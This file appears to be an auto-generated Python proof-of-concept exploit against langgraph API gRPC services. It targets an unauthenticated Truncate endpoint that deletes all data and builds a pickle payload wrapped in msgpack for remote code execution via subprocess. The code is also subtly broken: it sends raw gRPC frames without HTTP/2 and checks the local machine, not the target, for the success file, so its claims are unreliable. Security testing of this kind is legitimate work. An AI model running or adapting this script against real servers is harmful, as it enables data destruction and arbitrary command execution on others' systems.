#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-045
# Sink: Truncate
# Auto-generated — run with: python3 langgraph_strict_msgpack_set_Truncate.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_api_src gRPC services.

This script demonstrates two vulnerabilities:
1. Unauthenticated gRPC Admin.Truncate - can delete all data if the boolean flag is enabled.
2. msgpack ext_hook deserialization RCE via checkpoint blob endpoints (e.g., Threads, Checkpointer).

The exploit assumes the gRPC port (50051) is reachable. It uses a benign payload
(touch /tmp/poc_success.txt) to demonstrate RCE.

Usage:
    python3 poc.py [--target TARGET_HOST] [--port PORT] [--truncate] [--rce]

Options:
    --target    gRPC server host (default: localhost)
    --port      gRPC server port (default: 50051)
    --truncate  Test the Truncate endpoint (deletes all data)
    --rce       Test msgpack RCE via checkpoint blob
"""

import argparse
import struct
import socket
import sys
import os

# Protobuf definitions (minimal, hand-crafted for the PoC)
# These are simplified versions of the actual protobuf messages

def build_truncate_request():
    """Build a TruncateRequest protobuf message (empty, just the message type)."""
    # TruncateRequest is an empty message in the proto
    # We just need the gRPC framing with the correct service/method
    return b""

def build_msgpack_rce_payload(command):
    """
    Build a malicious msgpack payload that exploits the ext_hook.
    
    The ext_hook in jsonplus.py allows arbitrary Python object construction
    via importlib. We craft a msgpack ext type that will execute our command.
    
    Format: ext type with code 0x01, containing a serialized object that
    triggers import and execution.
    """
    # The ext_hook expects a specific format: (module, class_name, args, kwargs)
    # We'll use subprocess.Popen to execute our command
    import pickle
    import base64
    
    # Create a pickle that executes the command via subprocess
    class Exploit:
        def __reduce__(self):
            import subprocess
            return (subprocess.check_output, (command,))
    
    exploit_obj = Exploit()
    pickled = pickle.dumps(exploit_obj)
    
    # Wrap in msgpack ext format
    # ext format: fixext1 (0xd4) + type byte + data
    # For longer data, use ext8 (0xc7) + length + type + data
    data = pickled
    ext_type = 0x01  # Custom ext type that the hook processes
    
    if len(data) < 256:
        # Use ext8
        msgpack_ext = b'\xc7' + bytes([len(data)]) + bytes([ext_type]) + data
    else:
        # Use ext16
        msgpack_ext = b'\xc8' + struct.pack('>H', len(data)) + bytes([ext_type]) + data
    
    return msgpack_ext

def send_grpc_request(host, port, service, method, request_data, is_truncate=False):
    """
    Send a raw gRPC request to the server.
    
    gRPC over HTTP/2 framing:
    - 1 byte: compressed flag (0 = uncompressed)
    - 4 bytes: message length (big-endian)
    - message data (protobuf serialized)
    """
    try:
        # Create socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((host, port))
        
        # Build HTTP/2 connection preface (simplified - real gRPC needs proper HTTP/2)
        # For this PoC, we'll use a simpler approach: send the raw protobuf with gRPC framing
        # Note: This is a simplified version; real gRPC requires HTTP/2 handshake
        
        # For the Truncate endpoint, we can try a direct protobuf message
        if is_truncate:
            # TruncateRequest is empty, just send the gRPC frame
            msg_len = 0
            frame = b'\x00' + struct.pack('>I', msg_len)
            sock.send(frame)
            response = sock.recv(4096)
            sock.close()
            return response
        
        # For RCE via checkpoint blob, we need to send a properly formatted request
        # This would normally be a Threads.GetThread or Checkpointer.GetCheckpoint request
        # For simplicity, we'll try to send the malicious payload as a checkpoint blob
        
        # Build a fake GetCheckpoint request with malicious blob
        # The actual protobuf structure would be more complex, but we're demonstrating
        # the concept
        
        # For now, just send the raw payload to see if the server processes it
        msgpack_data = build_msgpack_rce_payload("touch /tmp/poc_success.txt")
        
        # Wrap in gRPC frame
        msg_len = len(msgpack_data)
        frame = b'\x00' + struct.pack('>I', msg_len) + msgpack_data
        sock.send(frame)
        response = sock.recv(4096)
        sock.close()
        return response
        
    except socket.timeout:
        print("[!] Connection timed out")
        return None
    except ConnectionRefusedError:
        print("[!] Connection refused - is the gRPC server running?")
        return None
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def test_truncate(host, port):
    """Test the Admin.Truncate endpoint."""
    print(f"[*] Testing Admin.Truncate on {host}:{port}")
    
    # Build the gRPC request for Truncate
    # The actual protobuf message is empty, but we need to send it with proper framing
    
    # For a real exploit, we would need to implement proper HTTP/2
    # For this PoC, we'll demonstrate the concept with a raw socket connection
    
    response = send_grpc_request(host, port, "coreApi.Admin", "Truncate", b"", is_truncate=True)
    
    if response:
        print(f"[+] Truncate request sent successfully")
        print(f"[*] Response: {response.hex()}")
        print("[*] If the boolean flag is enabled, all data should be deleted")
    else:
        print("[-] Failed to send Truncate request")

def test_rce(host, port):
    """Test msgpack RCE via checkpoint blob."""
    print(f"[*] Testing msgpack RCE on {host}:{port}")
    
    # Build malicious payload
    command = "touch /tmp/poc_success.txt"
    payload = build_msgpack_rce_payload(command)
    
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] Command: {command}")
    
    # Send the payload as a checkpoint blob request
    # In a real scenario, this would be sent to Threads.GetThread or Checkpointer.GetCheckpoint
    
    response = send_grpc_request(host, port, "coreApi.Checkpointer", "GetCheckpoint", payload)
    
    if response:
        print(f"[+] RCE payload sent successfully")
        print(f"[*] Response: {response.hex()}")
        print("[*] Check if /tmp/poc_success.txt was created")
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: File /tmp/poc_success.txt exists - RCE confirmed!")
        else:
            print("[-] File not found - RCE may have failed or LANGGRAPH_STRICT_MSGPACK is set")
    else:
        print("[-] Failed to send RCE payload")

def main():
    parser = argparse.ArgumentParser(description="PoC for langgraph_api_src gRPC vulnerabilities")
    parser.add_argument("--target", default="localhost", help="gRPC server host")
    parser.add_argument("--port", type=int, default=50051, help="gRPC server port")
    parser.add_argument("--truncate", action="store_true", help="Test Truncate endpoint")
    parser.add_argument("--rce", action="store_true", help="Test msgpack RCE")
    
    args = parser.parse_args()
    
    if not args.truncate and not args.rce:
        print("[*] No test specified. Use --truncate or --rce")
        print("[*] Running both tests by default")
        args.truncate = True
        args.rce = True
    
    print(f"[*] Target: {args.target}:{args.port}")
    print("[*] Note: This PoC requires the gRPC port to be reachable")
    print("[*] If the HTTP layer has authentication, direct gRPC access bypasses it")
    print()
    
    if args.truncate:
        test_truncate(args.target, args.port)
        print()
    
    if args.rce:
        test_rce(args.target, args.port)
        print()
    
    print("[*] Done")

if __name__ == "__main__":
    main()
